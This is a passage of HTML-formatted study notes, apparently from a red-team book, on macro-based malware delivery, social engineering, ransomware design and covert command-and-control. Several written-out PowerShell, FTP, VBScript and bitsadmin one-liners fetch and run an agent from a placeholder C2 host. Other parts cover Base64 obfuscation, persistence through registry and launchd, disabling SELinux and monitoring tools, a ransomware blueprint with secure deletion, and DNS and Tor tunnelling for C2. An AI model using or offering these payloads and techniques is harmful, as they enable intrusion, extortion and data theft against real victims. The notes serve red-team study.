<span class="nv">FilePath</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">C:</span><span class="se">\t</span><span class="s">emp\payload.vbs</span><span class="s2">&quot;</span> <span class="nv">PayloadFile</span> <span class="o">=</span> <span class="nv">FreeFile</span>
<span class="nv">Open</span> <span class="nv">FilePath</span> <span class="k">For</span> <span class="nv">Output</span> <span class="nv">As</span> <span class="nv">TextFile</span> <span class="nv">Print</span> #<span class="nv">PayLoadFile</span>, <span class="s2">&quot;</span><span class="s">VBS Script Line 1</span><span class="s2">&quot;</span> <span class="nv">Print</span> #<span class="nv">PayLoadFile</span>, <span class="s2">&quot;</span><span class="s"> VBS Script Line 2</span><span class="s2">&quot;</span> <span class="nv">Print</span> #<span class="nv">PayLoadFile</span>, <span class="s2">&quot;</span><span class="s"> VBS Script Line 3</span><span class="s2">&quot;</span> <span class="nv">Print</span> #<span class="nv">PayLoadFile</span>, <span class="s2">&quot;</span><span class="s"> VBS Script Line 4</span><span class="s2">&quot;</span>
    <span class="nv">Close</span> <span class="nv">PayloadFile</span>
<span class="nv">Shell</span> <span class="s2">&quot;</span><span class="s">wscript c:</span><span class="se">\t</span><span class="s">emp\payload.vbs</span><span class="s2">&quot;</span> <span class="k">End</span> <span class="nv">Sub</span>
</pre></div></li>
</ul>
</li>
<li>Code Obfuscation<ul>
<li>encode the lines of the payload as Base64 and decode them prior to writing them to the target file</li>
<li>XOR function</li>
</ul>
</li>
<li>Social engineering <ul>
<li>imply that information has been sent to them in error</li>
<li>it’s something they shouldn’t be seeing</li>
<li>Something that would give them an advantage in some way </li>
<li>Something that would put them at a disadvantage if they ignored it.   </li>
<li>Give the end user a compelling reason to enable macros.</li>
<li>Tailor the attack to the client</li>
<li><img alt="" src="../_assets/2020-08-14-23-30-20.png" /></li>
</ul>
</li>
<li>Powershell
  <div class="codehilite"><pre><span></span><span class="nv">Sub</span> <span class="nv">powershell</span><span class="ss">()</span>
    <span class="s1">&#39;</span><span class="s"> Powershell Macro</span>
    <span class="nv">Dim</span> <span class="nv">PSResponse</span> <span class="nv">As</span> <span class="nv">String</span>
    <span class="nv">PSResponse</span> <span class="o">=</span> <span class="nv">Shell</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">PowerShell (New-Object System.Net.WebClient). DownloadFile(&#39;http://ourc2server.com/download/c2agent.exe&#39;,&#39;agent. exe&#39;</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;Start-Process &#39;agent.exe&#39;&quot;, vbHide)</span>
<span class="k">End</span> <span class="nv">Sub</span>
</pre></div></li>
<li>FTP
  <div class="codehilite"><pre><span></span>open ourc2server.com
binary
get /c2agent.exe
quit
</pre></div>
  <div class="codehilite"><pre><span></span>cmd.exe /c <span class="s2">&quot;@echo open ourc2server.com&gt;script.txt&amp;@echo binary&gt;&gt;script.txt&amp; @echo get /c2agent.exe&gt;&gt;script.txt&amp;@echo quit&gt;&gt;script.txt&amp;@ftp -s:scrip t.txt -v -A&amp;@start c2agent.exe&quot;</span>
</pre></div></li>
<li>Windows Scripting Host (WSH)
  <div class="codehilite"><pre><span></span><span class="nv">strFileURL</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">http://ourc2server/downloads/c2agent.exe</span><span class="s2">&quot;</span>
<span class="nv">strHDLocation</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">agent.exe</span><span class="s2">&quot;</span>
<span class="nv">Set</span> <span class="nv">objXMLHTTP</span> <span class="o">=</span> <span class="nv">CreateObject</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">MSXML2.XMLHTTP</span><span class="s2">&quot;</span><span class="ss">)</span>
<span class="nv">objXMLHTTP</span>.<span class="nv">open</span> <span class="s2">&quot;</span><span class="s">GET</span><span class="s2">&quot;</span>, <span class="nv">strFileURL</span>, <span class="nv">false</span>
<span class="nv">objXMLHTTP</span>.<span class="k">send</span><span class="ss">()</span>
<span class="k">If</span> <span class="nv">objXMLHTTP</span>.<span class="nv">Status</span> <span class="o">=</span> <span class="mi">200</span> <span class="k">Then</span>
    <span class="nv">Set</span> <span class="nv">objADOStream</span> <span class="o">=</span> <span class="nv">CreateObject</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">ADODB.Stream</span><span class="s2">&quot;</span><span class="ss">)</span>
    <span class="nv">objADOStream</span>.<span class="nv">Open</span>
    <span class="nv">objADOStream</span>.<span class="nv">Type</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="nv">objADOStream</span>.<span class="nv">Write</span> <span class="nv">objXMLHTTP</span>.<span class="nv">ResponseBody</span>
    <span class="nv">objADOStream</span>.<span class="nv">Position</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="nv">objADOStream</span>.<span class="nv">SaveToFile</span> <span class="nv">strHDLocation</span>
    <span class="nv">objADOStream</span>.<span class="nv">Close</span>
    <span class="nv">Set</span> <span class="nv">objADOStream</span> <span class="o">=</span> <span class="nv">Nothing</span>
<span class="k">End</span> <span class="k">if</span>
<span class="nv">Set</span> <span class="nv">objXMLHTTP</span> <span class="o">=</span> <span class="nv">Nothing</span>
<span class="nv">Set</span> <span class="nv">objShell</span> <span class="o">=</span> <span class="nv">CreateObject</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">WScript.Shell</span><span class="s2">&quot;</span><span class="ss">)</span>
<span class="nv">objShell</span>.<span class="k">Exec</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">agent.exe</span><span class="s2">&quot;</span><span class="ss">)</span>
</pre></div>
  <div class="codehilite"><pre><span></span>cmd.exe /c <span class="s2">&quot;@echo Set objXMLHTTP=CreateObject(&quot;</span>MSXML2.XMLHTTP<span class="s2">&quot;)&gt;poc.vbs &amp;@echo objXMLHTTP.open &quot;</span>GET<span class="s2">&quot;,&quot;</span>http://ourc2server/downloads/c2agent. exe<span class="s2">&quot;,false&gt;&gt;poc.vbs</span>
<span class="p">&amp;@</span><span class="k">echo</span> objXMLHTTP.send()<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> If objXMLHTTP.Status=200 Then<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objADOStream=CreateObject(<span class="s2">&quot;ADODB.Stream&quot;</span>)<span class="p">&gt;&gt;</span>poc.vbs <span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Open<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Type=1 <span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Write objXMLHTTP.ResponseBody<span class="p">&gt;&gt;</span>poc.vbs <span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Position=0 <span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.SaveToFile <span class="s2">&quot;agent.exe&quot;</span><span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Close<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objADOStream=Nothing<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> End if<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objXMLHTTP=Nothing<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objShell=CreateObject(<span class="s2">&quot;WScript.Shell&quot;</span>)<span class="p">&gt;&gt;</span>poc.vbs <span class="p">&amp;@</span><span class="k">echo</span> objShell.Exec(<span class="s2">&quot;agent.exe&quot;</span>)<span class="p">&gt;&gt;</span>poc.vbs<span class="p">&amp;</span>cscript.exe poc.vbs<span class="s2">&quot;</span>
</pre></div></li>
<li>BITSadmin: <code class="codehilite"><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="k">c</span> <span class="ss">&quot;bitsadmin /transfer myjob /download /priority high http://ourc2server.com/download/c2agent.exe c:\agent.exe&amp;start agent.exe&quot;</span></code></li>
<li>Base64 encode:
  <div class="codehilite"><pre><span></span><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$b</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s2">&quot;PowerShell (N ew-Object System.Net.WebClient).DownloadFile(&#39;http://ourc2server.com/download/c2agent.exe&#39;,&#39;agent.exe&#39;);Start-Process &#39;agent.exe&#39;&quot;</span><span class="p">)</span>
<span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span>
</pre></div></li>
</ul>
</li>
<li>Part 2: Using the Java Applet for Payload Delivery<ul>
<li>Java Code Signing<ul>
<li>completely unrealistic security model that lulls users into a false sense of security.</li>
<li>Getting a signing cert:<ul>
<li>Register a domain name that is similar to an existing business</li>
<li>Clone and host that website </li>
<li>Change all phone contact information </li>
<li>Consider a company well outside of the code signer’s normal business area </li>
</ul>
</li>
<li>SMTP: <a href="https://tools.ietf.org/html/rfc6531">https://tools.ietf.org/html/rfc6531</a><ul>
<li>never use the same IPs for mail delivery and C2</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Part 3: Physical Media <ul>
<li>official looking letter giving instructions to the target</li>
<li>Target Location Profiling<ul>
<li>Create a list of ~100 and send a mail. Extract address from reply. </li>
</ul>
</li>
<li>installer such as InstallShield or Inno</li>
<li>payloads are installed to somewhere they won’t be found and executed, whereas our dummy application should be the thing that draws attention. (install with a desktop icon etc.)</li>
<li>also  drop the PowerView PowerShell script</li>
<li>When hand delivering.  Don’t queue. </li>
<li>official, appears to come from an official source, and seems mandatory</li>
</ul>
</li>
<li>Part 4: Client-Side Exploits 1<ul>
<li>Flash exploits</li>
</ul>
</li>
<li>Part V: Simulating a Ransomware Attack<ul>
<li>could just be one component in a larger APT scenario</li>
<li>Asymmetric cryptography only<ul>
<li><code class="codehilite"><span class="n">libgcrypt</span></code><ul>
<li><code class="codehilite"><span class="n">gcry_pk_encrypt</span></code>—Encrypt data using a public key.</li>
<li><code class="codehilite"><span class="n">gcry_pk_decrypt</span></code>—Decrypt data using a private key.</li>
<li><code class="codehilite"><span class="n">gcry_pk_genkey</span></code>—Create a new public/private key pair.</li>
</ul>
</li>
</ul>
</li>
<li>Remote key generation<ul>
<li>C2 agent should send a request to the C2 server requesting that a private and a public key pair be generated</li>
<li>Public key is then downloaded to the agent</li>
</ul>
</li>
<li>Configurable<ul>
<li>target specific file groups</li>
<li>target local/network shares</li>
</ul>
</li>
<li>File operations <ul>
<li>enumerate all drives and scan them for files</li>
<li>As each file is encrypted, its name should be added to a list somewhere</li>
<li>original file should be destroyed through cryptographic scrubbing.</li>
<li>secure-delete </li>
<li>hashing and overwriting the file is one example of how this may be achieved</li>
<li>encrypted file should be placed in the same directory</li>
</ul>
</li>
<li>notify<ul>
<li>generating a SHA hash of the public key </li>
<li>providing that string as a reference when requesting payment</li>
</ul>
</li>
<li>ability to export the names of all encrypted files back to the C2 server</li>
</ul>
</li>
<li>Part VI: Deploying with HTA<ul>
<li>HTA</li>
<li>Add icon to hta</li>
</ul>
</li>
<li>Part VII: USB Shotgun Attack<ul>
<li>Starting with Windows 7, the OS no longer supports the AutoRun functionality for non-optical removable media. AutoPlay will still work on CDs and DVDs (the user will be given the option to execute the code, but it won’t happen automatically); however, it will no longer work at all for USB drives</li>
</ul>
</li>
<li>Part VIII: Miscellaneous Rich Web Content<ul>
<li>Java Web Start </li>
<li>Adobe Air</li>
<li>InDesign plugin<ul>
<li>Create a document and package all dependencies with the document</li>
</ul>
</li>
</ul>
</li>
<li>Democratic People’s Republic of Korea (DPRK) <ul>
<li>Democratic People’s Republic of Korea (DPRK) - Red Star OS<ul>
<li>No root. Discretionary Access Control (DAC) provided by SE Linux</li>
<li>Grant root by: <code class="codehilite"><span class="n">rootsetting</span></code></li>
<li>Stop SE Linux: <code class="codehilite"><span class="n">setenforce</span> <span class="mi">0</span></code> <code class="codehilite"><span class="n">killall</span> <span class="o">-</span><span class="mi">9</span> <span class="n">securityd</span></code></li>
<li>Kill monitoring apps: <code class="codehilite"><span class="n">killall</span> <span class="n">scnprc</span></code> <code class="codehilite"><span class="n">killall</span> <span class="n">opprc</span></code> </li>
</ul>
</li>
<li>Phone system<ul>
<li>Needs entry through operator at +850 2 18111 (850 is the country code for DPRK and 2 is Pyongyang)</li>
<li>Numbers that can dial internationally cannot dial locally</li>
<li>War-dialing. VoIP calling to reduce cost.</li>
<li>Record samples. Any tones that fall within a certain frequency we log as modems. Modem responses will contain the following tone DTMFs: 2250hz + 1625hz, 1850hz, 2000hz...</li>
<li>WarVOX: <a href="https://github.com/rapid7/warvox">https://github.com/rapid7/warvox</a></li>
<li>Grab audio/video from android. If SSL site, permissions are requested only once.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Command and Control <ul>
<li>Part 1: Basics and Essentials<ul>
<li>Essentials<ul>
<li>Egress connectivity</li>
<li>Stealth<ul>
<li>fake the timestamp on the executable (show it was there for long time)</li>
<li>Svchost.exe and spoolsv.exe make the best targets because there are usually several copies running in memory</li>
</ul>
</li>
<li>Remote file system access</li>
<li>Remote command execution</li>
<li>Secure communications</li>
<li>Persistence<ul>
<li>Windows<ul>
<li><code class="codehilite"><span class="n">HKCU</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Run</span></code></li>
<li><code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="k">Options</span></code></li>
<li><code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Wow6432Node</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="k">Options</span></code></li>
<li>Services<ul>
<li>need to be specially compiled as a Windows service</li>
</ul>
</li>
<li>drop a DLL instead of an EXE and reference it from a Registry key using rundll32<ul>
<li><code class="codehilite"><span class="nt">rundll32</span><span class="p">.</span><span class="nc">exe</span> <span class="nt">javascript</span><span class="o">:</span><span class="s2">&quot;\..\mshtml,RunHTMLApplication &quot;</span><span class="o">;</span><span class="nt">alert</span><span class="o">(</span><span class="s1">&#39;Boo!&#39;</span><span class="o">);</span></code></li>
</ul>
</li>
<li>largest database of autorun methods: <a href="https://technet.microsoft.com/en-gb/sysinternals/bb963902.aspx">https://technet.microsoft.com/en-gb/sysinternals/bb963902.aspx</a></li>
</ul>
</li>
<li>Linux<ul>
<li>System V init<ul>
<li>On Older OSes<ul>
<li>Debian 6 and earlier </li>
<li>Ubuntu 9.04 and earlier </li>
<li>CentOS 5 and earlier</li>
</ul>
</li>
<li>Bash init script at <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">service</span></code></li>
<li>Then run <code class="codehilite"><span class="n">sudo</span> <span class="k">update</span><span class="o">-</span><span class="n">rc</span><span class="p">.</span><span class="n">d</span> <span class="n">service</span> <span class="n">enable</span></code></li>
<li>This create a symlink in the runlevel directories 2 though 5</li>
<li>Add following to /etc/inittab: <code class="codehilite"><span class="n">id</span><span class="o">:</span><span class="mi">2345</span><span class="o">:</span><span class="n">respawn</span><span class="o">:/</span><span class="n">bin</span><span class="sr">/sh /path/to/application/s</span><span class="n">tartup</span></code></li>
<li><code class="codehilite"><span class="n">sudo</span> <span class="n">service</span> <span class="n">service</span> <span class="n">stop</span></code></li>
<li><code class="codehilite"><span class="n">sudo</span> <span class="n">service</span> <span class="n">service</span> <span class="k">start</span></code></li>
</ul>
</li>
<li>Upstart<ul>
<li>OSes<ul>
<li>Introduced: Ubuntu 6</li>
<li>Default in: Ubuntu 9.10</li>
<li>Red Hat Enterprise 6</li>
<li>Google Chrome OS</li>
<li>Ubuntu 9.10 to Ubuntu 14.10</li>
<li>CentOS 6</li>
</ul>
</li>
</ul>
</li>
<li>systemd<ul>
<li>configuration script in <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span></code> called <code class="codehilite"><span class="n">servicename</span><span class="p">.</span><span class="n">conf</span></code></li>
<li>Make sure it contains (runs on boot and will respawn if it dies): <code class="codehilite"><span class="k">start</span> <span class="k">on</span> <span class="n">runlevel</span> <span class="p">[</span><span class="mi">2345</span><span class="p">]</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">respawn</span></code></li>
<li>Create: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="k">system</span><span class="o">/</span><span class="n">multi</span><span class="o">-</span><span class="k">user</span><span class="p">.</span><span class="n">target</span><span class="p">.</span><span class="n">wants</span><span class="o">/</span><span class="n">service</span><span class="p">.</span><span class="n">service</span></code><ul>
<li>Should contain: <code class="codehilite"><span class="k">Restart</span><span class="o">=</span><span class="n">always</span></code> under <code class="codehilite"><span class="o">[</span><span class="n">Service</span><span class="o">]</span><span class="w"></span></code> section</li>
</ul>
</li>
<li>Start: <code class="codehilite"><span class="n">sudo</span> <span class="n">systemctl</span> <span class="n">enable</span> <span class="n">service</span><span class="p">.</span><span class="n">service</span></code></li>
</ul>
</li>
<li>cron</li>
<li>init files <ul>
<li>/etc/profile</li>
<li>/etc/profile.d/*.sh</li>
</ul>
</li>
<li>Graphical environments  </li>
<li>Rootkits: binary on the target system that has been replaced by malicious code yet retains the functionality of the original</li>
</ul>
</li>
<li>OSX<ul>
<li>cron</li>
<li>first user-mode app to start is <code class="codehilite"><span class="n">launchd</span></code>. abusable by:<ul>
<li><code class="codehilite"><span class="n">echo</span> <span class="n">bsexec</span> <span class="mi">1</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="n">payload</span><span class="p">.</span><span class="n">script</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">launchd</span><span class="p">.</span><span class="n">conf</span></code></li>
</ul>
</li>
<li>startup items<ul>
<li>place two items in a subdir within startup dir (<code class="codehilite"><span class="o">/</span><span class="k">System</span><span class="o">/</span> <span class="n">Library</span><span class="o">/</span><span class="n">StartupItems</span> <span class="k">or</span> <span class="o">/</span><span class="n">Library</span><span class="o">/</span><span class="n">StartupItems</span></code>)<ul>
<li><code class="codehilite"><span class="n">StartupParameters</span><span class="p">.</span><span class="n">plist</span></code> must contain </li>
<li><code class="codehilite"><span class="n">Provides</span></code> key containing name of script file<ul>
<li>name of the sub-directory must be the same as the name of the script file </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Port forwarding</li>
<li>Control thread</li>
</ul>
</li>
<li>C2 Server<ul>
<li>SSH serving running on TCP port 443</li>
<li>Chroot jail to contain the SSH server</li>
<li>Modified SSH configuration to permit remotely forwarded tunnels</li>
</ul>
</li>
<li>Payload (use <code class="codehilite"><span class="n">libssh</span></code>)<ul>
<li>Implementation of SSH server on non-standard TCP port (ex: 900)</li>
<li>Implementation of SSH client permitting connections back to C2 server</li>
<li>Implementation of SSH tunnels (both local and dynamic) over the SSH client permitting C2 access to target file system and processes</li>
</ul>
</li>
</ul>
</li>
<li>Part 2: Advanced Attack Management<ul>
<li>Stealth and Multiple System Management</li>
<li><strong>Beaconing</strong>: periodically call home (your C2 server) for orders rather than immediately establishing an SSH connection and reverse tunnel</li>
<li><strong>Pre-configured command set</strong>—An established set of instructions<ul>
<li>Sleep (~60 seconds)</li>
<li>OpenSSHTunnel<ul>
<li>SSH connection back to the C2</li>
<li>initiate a reverse tunnel allowing C2 to access the target’s file system</li>
<li>L22C900</li>
</ul>
</li>
<li>Close SSHTunnel</li>
<li>OpenTCPTunnel<ul>
<li>SSH connection back to the C2</li>
<li>and open a reverse tunnel to any port on the target for accessing local services</li>
<li>LxxxCxxx</li>
</ul>
</li>
<li>CloseTCPTunnel</li>
<li>OpenDynamic<ul>
<li>SSH connection back to the C2 </li>
<li>and open both a dynamic tunnel and a reverse TCP tunnel pointing to it</li>
<li>SOCKS5 proxy server</li>
</ul>
</li>
<li>CloseDynamic</li>
<li>Task<ul>
<li>Download an executable from the web</li>
</ul>
</li>
</ul>
</li>
<li><strong>Tunnel management</strong>—The C2 server needs to be able to handle multiple simultaneous inbound connections</li>
<li><strong>Web-based frontend</strong><ul>
<li>Web server: tinyhttpd</li>
<li>Scripting language: Python</li>
<li>Database: PostgreSQL</li>
<li>AJAX</li>
<li>IPs, hostnames, etc</li>
<li>ports are currently open</li>
<li>which hosts they are assigned to</li>
<li>function to periodically check the status of open tunnels and mark closed</li>
<li>have a way to stack commands </li>
</ul>
</li>
</ul>
</li>
<li>Part 3: Advanced Channels and Data Exfiltration<ul>
<li>ICMP packets were dropped is irrelevant: I can use DNS resolution itself as a means of command and control.</li>
<li><code class="codehilite"><span class="n">dig</span> <span class="o">+</span><span class="n">trace</span></code> - using iterative querie sand following the referrals all the way</li>
<li>communicate to our C2 via recursive DNS queries </li>
<li>1<sup>st</sup> POC - Dan Kaminsky in 2004 with OzymanDNS</li>
<li><code class="codehilite"><span class="n">dnscat2</span></code><ul>
<li><code class="codehilite"><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="k">get</span> <span class="n">install</span> <span class="n">ruby</span><span class="o">-</span><span class="n">dev</span></code></li>
<li><a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a></li>
<li><code class="codehilite"><span class="n">ruby</span> <span class="p">.</span><span class="o">/</span><span class="n">dnscat2</span><span class="p">.</span><span class="n">rb</span> <span class="n">anti</span><span class="o">-</span><span class="n">virus</span><span class="o">-</span><span class="k">update</span><span class="p">.</span><span class="n">com</span></code></li>
<li>modifications to the C source to avoid detection</li>
<li>...</li>
<li><code class="codehilite"><span class="k">listen</span> <span class="p">[</span><span class="mi">0000</span><span class="p">:]</span><span class="mi">443</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">443</span></code> to create a tunnel between you and remote 443 (then SSH to remote via tunnel)</li>
</ul>
</li>
</ul>
</li>
<li>Part V: Creating a Covert C2 Solution<ul>
<li>Onion Router<ul>
<li>Routed through several layers of routers</li>
<li>Each layer can only see its own upstream and downstream connections in any session and traffic is encrypted</li>
<li>If attackers control the exit node, they can see the traffic going to its final destination</li>
<li>correlation attacks that can be executed by major players (example NSA)<ul>
<li>identified by cross-referencing packets entering and leaving the Tor network</li>
</ul>
</li>
<li>C2 server can be provisioned as a node within the Tor network<ul>
<li>compromised host will connect to Tor when it comes online</li>
<li>remaining operational access, even if compromised hosts are detected</li>
</ul>
</li>
</ul>
</li>
<li>Impl<ul>
<li>Tor stores its configuration in a file called torrc</li>
<li>To create a hidden service:
  <div class="codehilite"><pre><span></span><span class="o">#</span> <span class="n">Configure</span> <span class="n">hidden</span> <span class="n">service</span> <span class="n">directory</span> <span class="n">Hidden</span>
<span class="n">ServiceeDir</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">wil</span><span class="o">/</span><span class="n">tor_hidden</span> 
<span class="o">#</span> <span class="n">C2</span> <span class="n">Web</span> <span class="n">Port</span>
<span class="n">HiddenServicePort</span> <span class="mi">443</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">4433</span>
<span class="o">#</span> <span class="n">C2</span> <span class="n">SSH</span> <span class="n">Port</span>
<span class="n">HiddenServicePort</span> <span class="mi">7022</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">7022</span> 
<span class="o">#</span> <span class="n">C2</span> <span class="n">Metasploit</span> <span class="n">listener</span>
<span class="n">HiddenServicePort</span> <span class="mi">8080</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">8080</span>
</pre></div></li>
<li>next time Tor is started, two files will be created in the tor_hidden directory<ul>
<li>private_key file</li>
<li>hostname file that contains a hash of the public key<ul>
<li>address of your C2</li>
</ul>
</li>
</ul>
</li>
<li>Agent<ul>
<li>bundle the tor.exe (rename first) command-line application with the agent and simply execute it without parameters</li>
<li>this will open a SOCKS proxy port on localhost 9050</li>
<li>Tell the SSH SOCKS proxy to upstream to the Tor SOCKS proxy on TCP 9050</li>
</ul>
</li>
<li>Restrictions<ul>
<li>Some networks may block port TCP 9050 outbound or even dynamically blacklist all Tor nodes</li>
<li>Tell C2 agent to use Tor bridges when connecting</li>
<li>achieved by adding the following options to the local torrc configuration file (or command line args)
  <div class="codehilite"><pre><span></span><span class="n">Bridge</span> <span class="n">fte</span> <span class="mi">128</span><span class="p">.</span><span class="mi">105</span><span class="p">.</span><span class="mi">214</span><span class="p">.</span><span class="mi">163</span><span class="p">:</span><span class="mi">8080</span> <span class="n">A17A40775FBD2CA1184BF80BFC330A77ECF9D0E9</span> 
<span class="n">Bridge</span> <span class="n">fte</span> <span class="mi">192</span><span class="p">.</span><span class="mi">240</span><span class="p">.</span><span class="mi">101</span><span class="p">.</span><span class="mi">106</span><span class="p">:</span><span class="mi">80</span> <span class="n">FDC5BA65D93B6BCA5EBDF8EF8E4FA936B7F1F8E5</span> 
<span class="n">Bridge</span> <span class="n">fte</span> <span class="mi">128</span><span class="p">.</span><span class="mi">105</span><span class="p">.</span><span class="mi">214</span><span class="p">.</span><span class="mi">162</span><span class="p">:</span><span class="mi">8080</span> <span class="n">FC562097E1951DCC41B7D7F324D88157119BB56D</span> 
<span class="n">Bridge</span> <span class="n">fte</span> <span class="mi">50</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">176</span><span class="p">.</span><span class="mi">114</span><span class="p">:</span><span class="mi">80</span> <span class="mi">2</span><span class="n">BD466989944867075E872310EBAD65BC88C8AEF</span> 
<span class="n">Bridge</span> <span class="n">fte</span> <span class="mi">131</span><span class="p">.</span><span class="mi">252</span><span class="p">.</span><span class="mi">210</span><span class="p">.</span><span class="mi">150</span><span class="p">:</span><span class="mi">8080</span> <span class="mi">0</span><span class="n">E858AC201BF0F3FA3C462F64844CBFFC7297A42</span>
<span class="n">Bridge</span> <span class="n">fte</span> <span class="mi">128</span><span class="p">.</span><span class="mi">105</span><span class="p">.</span><span class="mi">214</span><span class="p">.</span><span class="mi">161</span><span class="p">:</span><span class="mi">8080</span> <span class="mi">1</span><span class="n">E326AAFB3FCB515015250D8FCCC8E37F91A153B</span>
<span class="n">UseBridges</span> <span class="mi">1</span>
</pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Part VI: The Creeper Box<ul>
<li>Using Raspberry Pi</li>
<li>PoE (forensic analysis become hard)</li>
<li>3G/4G adapter<ul>
<li>ppp</li>
<li>sakis3g</li>
</ul>
</li>
<li>Configuring Full-Disk Encryption (this involves lot of steps. Ref to book for details)</li>
<li>Enable the SSH server</li>
<li>change the MAC address (router/switch)</li>
<li>configuring a fake Cisco telnet or SSH daemon</li>
<li>bridge between between either a switch and a host or a switch and router<ul>
<li>bridge-utils</li>
</ul>
</li>
<li>Using a Pi as a Wireless AP to Provision Access by Remote Keyloggers</li>
<li>Label that says "Do not tamper"with company logo.</li>
</ul>
</li>
<li>Part VII: Advanced Autonomous Data Exfiltration<ul>
<li>Physical Media<ul>
<li>Detect removable media </li>
<li>Target data to exfiltrate packaged on to the drive</li>
<li>Embedded into some pseudo-executable format (HTA)</li>
<li>"Hail Mary"</li>
<li>BlackHat: <a href="https://www.youtube.com/watch?v=nuruzFqMgIw">https://www.youtube.com/watch?v=nuruzFqMgIw</a><ul>
<li>USB act like a regular drive. </li>
<li>When plugged in during boot, it act as a keyboard and a linux drive.</li>
<li>Replace the bootloader with its own.</li>
</ul>
</li>
</ul>
</li>
<li>Dropbox to bypass restrictions (Dropbox doesn't do malware checks)</li>
<li>Email<ul>
<li>Use API when possible: example: Outlook API</li>
<li>check if a domain has SPF protection (before spoofing)</li>
</ul>
</li>
<li>Wifi<ul>
<li>Connect the laptop via wireless to an AP that you control</li>
<li>hidden feature in Windows that allows you to host your own AP while being simultaneously connected to another one with the same adapter (Internet Connection Sharing)<ul>
<li><code class="codehilite"><span class="n">netsh</span> <span class="n">wlan</span> <span class="k">set</span> <span class="n">hostednetwork</span> <span class="k">mode</span> <span class="o">=</span><span class="ss">&quot;allow&quot;</span> <span class="n">ssid</span><span class="o">=</span><span class="ss">&quot;C2backdoor&quot;</span> <span class="k">key</span> <span class="o">=</span> <span class="ss">&quot;password&quot;</span></code></li>
<li><code class="codehilite"><span class="n">net</span> <span class="k">start</span> <span class="n">SharedAccess</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Mobile data / Bluetooth / SMS</li>
<li>Dongle <ul>
<li>stealth installs the 3G/4G drivers<ul>
